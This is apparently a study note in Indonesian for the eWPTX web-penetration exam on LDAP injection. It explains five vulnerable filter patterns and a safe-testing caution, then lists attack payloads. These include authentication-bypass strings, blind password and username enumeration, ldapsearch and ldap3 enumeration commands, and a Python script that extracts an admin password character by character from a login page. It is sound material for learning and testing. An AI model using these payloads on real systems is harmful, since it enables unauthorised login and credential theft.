2026-02-04 06:27

Status:

Tags: [[eWPTX]] [[LDAP]] [[LDAP Injection]]
###### Prasyarat: [[LDAP Injection - Overview]] [[LDAP Injection - Filter Syntax & Escaping]]
# LDAP Injection - Contoh

## Contoh 1: Fitur search (hasil melebar)

Skenario: aplikasi mengizinkan user mencari directory berdasarkan nama:

```text
(&(objectClass=person)(cn={input}))
```

Jika `{input}` tidak di-escape, metacharacter LDAP bisa mengubah filter sehingga match **lebih luas dari yang dimaksud**.

Yang biasanya terlihat:

- input normal menghasilkan beberapa match
    
- karakter spesial menyebabkan match “terlalu banyak” atau perilaku berubah
    

Kenapa penting:

- aplikasi bisa menampilkan user tambahan beserta atributnya (email, departemen, telepon)
    

---

## Contoh 2: Listing printer (perilaku true/false)

Skenario: menampilkan printer Canon jika ada:

```text
(&(objectClass=printer)(type=Canon*))
```

Jika `type` berasal dari input user dan tidak di-escape, wildcard bisa mengubah “match spesifik” menjadi “match banyak”.

Yang biasanya terlihat:

- ikon muncul/hilang tergantung input (sinyal blind)
    

---

## Contoh 3: Alur autentikasi (manipulasi logika)

Skenario: aplikasi melakukan search LDAP untuk entry user saat login:

```text
(&(uid={username})(password={password}))
```

Pola berisiko:

- aplikasi **merakit string filter** memakai `{username}` / `{password}` mentah
    
- lalu menganggap “LDAP mengembalikan minimal 1 entry” sebagai login sukses
    

Dampak:

- input yang memodifikasi struktur filter bisa membuat search mengembalikan entry walau kredensial salah.

---

## Contoh 4: Check otorisasi via group

Skenario: aplikasi mengecek membership sebelum menampilkan halaman admin:

```text
(&(objectClass=group)(cn=Admins)(member={userDn}))
```

Jika `{userDn}` (atau username yang dipetakan menjadi `{userDn}`) tidak ditangani dengan aman, manipulasi filter dapat merusak asumsi “hanya Admins yang lolos”.

Kenapa ini penting:

- check otorisasi biasanya berdampak lebih tinggi daripada sekadar halaman pencarian data
    

---

## Contoh 5: Account recovery / “apakah user ada?”

Skenario: password reset mengecek apakah email ada:

```text
(&(objectClass=person)(mail={email}))
```

Jika UI bereaksi berbeda antara “match” vs “no match”, injection bisa jadi kanal **user enumeration**:

- konten response berbeda
    
- status code berbeda
    
- timing berbeda
    
---

## Catatan untuk testing yang aman

- Hanya test pada sistem yang kamu miliki / kamu berwenang mengujinya.
- Perlakukan LDAP injection seperti blind SQLi: konfirmasi lewat **perbedaan perilaku**, bukan dengan “dump semuanya”.

---

## Payload Injection (contoh)

### Authentication Bypass
```
# Close the filter and add always-true condition
username: admin)(|(cn=*
password: anything

# Result: (&(uid=admin)(|(cn=*)(password=anything)))
# The (|(cn=*) matches everything — bypass

# Another variant
username: *)(uid=*))(|(uid=*
password: anything
```

### Blind LDAP Enumeration
```
# Character-by-character extraction of admin password
# Jika respons berbeda (true vs false):
password=a*    → false
password=b*    → false
password=s*    → true (first char is 's')
password=se*   → true (second char is 'e')
password=sec*  → true
# Continue until full value extracted

# Enumerate usernames
uid=a*   → exists
uid=ad*  → exists
uid=adm* → exists
uid=admin → found
```

### Contoh `ldapsearch` (CLI)
```bash
# Basic search
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(uid=admin)"

# Anonymous bind enumeration
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(objectClass=*)"

# Authenticated search
ldapsearch -x -H ldap://target:389 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# Search for specific attributes
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(uid=*)" uid cn mail
```

### Library `ldap3` (Python)
```python
from ldap3 import Server, Connection, ALL

# Connect
server = Server('ldap://target:389', get_info=ALL)
conn = Connection(server, auto_bind=True)

# Search
conn.search('dc=example,dc=com', '(uid=admin)', attributes=['cn', 'mail', 'uid'])
for entry in conn.entries:
    print(entry)

# Enumerate with wildcard (if anonymous bind allowed)
conn.search('dc=example,dc=com', '(objectClass=person)', attributes=['uid', 'cn'])
```

### Script boolean oracle
```python
import requests

charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''

for pos in range(20):
    for c in charset:
        payload = f"{password}{c}*"
        r = requests.post('http://target/login', data={
            'username': 'admin',
            'password': payload
        })
        if 'Welcome' in r.text:
            password += c
            print(f"[+] Found: {password}")
            break
    else:
        break

print(f"[+] Password: {password}")
```
